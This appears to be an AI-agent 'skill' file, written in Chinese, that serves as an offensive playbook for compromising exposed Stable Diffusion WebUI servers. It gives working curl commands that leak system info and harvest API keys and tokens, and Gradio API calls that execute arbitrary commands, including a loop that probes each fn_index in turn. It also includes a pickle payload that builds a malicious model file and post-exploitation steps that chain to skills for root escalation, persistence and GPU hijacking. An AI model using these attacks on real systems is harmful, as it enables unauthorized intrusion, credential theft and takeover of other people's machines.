---
name: stable-diffusion-webui-rce
description: "Use when targeting SD WebUI, Gradio AI art, 7860."
---

# Stable Diffusion WebUI — 未授权 RCE + 信息泄露

## 攻击面总览

| 面 | 路径 | 前置 | 效果 |
|----|------|------|------|
| **sysinfo 泄露** | `GET /internal/sysinfo-download` | 无鉴权 | 完整系统信息（环境变量、启动参数、路径、GPU、插件列表） |
| **扩展 RCE** | Gradio API `fn_index` 调用 `run()` | 装了 `sd-colab-commands-browser` 等命令执行扩展 | `subprocess.getoutput(cmd)` 任意命令执行 |
| **Gradio API 未授权** | `/api/predict` · `/queue/push` | WebUI 未设 `--gradio-auth` | 调用任意注册的 Gradio 函数 |
| **模型投毒 RCE** | 上传恶意 `.ckpt`（pickle payload） | 能上传文件或替换模型 | 模型加载时反序列化执行 |
| **API 密码泄露** | sysinfo 里 `--api-auth` 参数 | sysinfo 可达 | 拿到 API 认证凭据 |

## 侦察

### FOFA 测绘

```
title="Stable Diffusion" || body="stable-diffusion-webui"
body="gradio" && (port="7860" || port="7861")
```

### 指纹确认

```bash
curl -s -m 10 http://<T>:7860/ | grep -oE '(Stable Diffusion|stable-diffusion|gradio)' | head -3

curl -s -m 10 http://<T>:7860/internal/sysinfo-download | python3 -c "
import sys,json
d=json.load(sys.stdin)
print('Version:', d.get('Version','?'))
print('GPU:', [g.get('name','?') for g in d.get('GPU',[])])
print('Extensions:', [e.get('name','?') for e in d.get('Extensions',[])])
print('Commandline:', d.get('Config',{}).get('commandline_args','?'))
"
```

## 漏洞利用

### ① sysinfo 泄露（零门槛）

```bash
curl -s http://<T>:7860/internal/sysinfo-download -o sysinfo.json

python3 -c "
import json
d=json.load(open('sysinfo.json'))
print('CMD:', d.get('Config',{}).get('commandline_args',''))
for k,v in d.get('Environment',{}).items():
    if any(x in k.lower() for x in ['key','token','pass','secret','auth']):
        print(f'ENV: {k}={v}')
"
```

关键看点：`--api-auth user:pass`、`HF_TOKEN`、`OPENAI_API_KEY`、`CIVITAI_API_KEY`、扩展列表里有没有 RCE 扩展

### ② 扩展 RCE（装了命令执行扩展）

**sd-colab-commands-browser** 源码核心（`scripts/colab.py`）：
```python
def run(command):
    out = getoutput(f"{command}")  # 直接执行，无任何过滤
    return out
```

利用：
```bash
# 方法 1: Gradio predict API
curl -s http://<T>:7860/api/predict \
  -H 'Content-Type: application/json' \
  -d '{"fn_index":0,"data":["id && whoami && uname -a"]}'

# 方法 2: 新版 Gradio queue
curl -s http://<T>:7860/queue/push \
  -H 'Content-Type: application/json' \
  -d '{"fn_index":0,"data":["cat /etc/passwd"],"session_hash":"test123"}'

# 方法 3: 遍历 fn_index 找命令执行函数
for i in $(seq 0 50); do
  R=$(curl -s -m 5 http://<T>:7860/api/predict \
    -H 'Content-Type: application/json' \
    -d "{\"fn_index\":$i,\"data\":[\"echo PWNED_$i\"]}" 2>/dev/null)
  echo "$R" | grep -q PWNED && echo "[!] fn_index=$i 命令执行!" && break
done
```

### ③ 模型投毒（pickle RCE）

```python
import pickle, torch, os, sys

class Evil(object):
    def __reduce__(self):
        cmd = sys.argv[2] if len(sys.argv) > 2 else 'id > /tmp/pwned'
        return (os.system, (cmd,))

out = sys.argv[1] if len(sys.argv) > 1 else 'evil.ckpt'
torch.save({'state_dict': Evil()}, out)
print(f'[+] 恶意模型已生成: {out}')
```

投放路径：`models/Stable-diffusion/`、通过 WebUI 上传、替换已有模型文件

### ④ Gradio 未授权（无 --gradio-auth）

```bash
curl -s -o /dev/null -w '%{http_code}' http://<T>:7860/
# 200 = 无认证（裸奔）; 401 = 有认证
curl -s http://<T>:7860/sdapi/v1/cmd-flags
curl -s http://<T>:7860/sdapi/v1/options
```

## 后利用：串联 GPU 猎杀

拿到 SD WebUI 的 shell 后，这台机器**必有 GPU**：

```bash
nvidia-smi 2>/dev/null && echo 'GPU 确认'
cat /proc/1/cgroup 2>/dev/null | grep -q docker && echo '容器内' || echo '宿主'
whoami  # Colab/Docker 常直接是 root

# 已是 root → 直接部署（调 venom-hydra skill）
# 不是 root → 提权（调 venom-root skill）
# 测绘同网段其他 GPU 机器（调 gpu-hunter skill）
```

## 相关 skill

- `gpu-hunter` — GPU 测绘猎杀
- `venom-root` — 投毒夺 root 全链
- `venom-hydra` — 九头蛇持久化

## 参考

- https://github.com/Iyashinouta/sd-colab-commands-browser（命令执行扩展源码）
- SD WebUI `/internal/sysinfo-download` 是**内置端点**（非扩展），源码在 `modules/sysinfo.py`
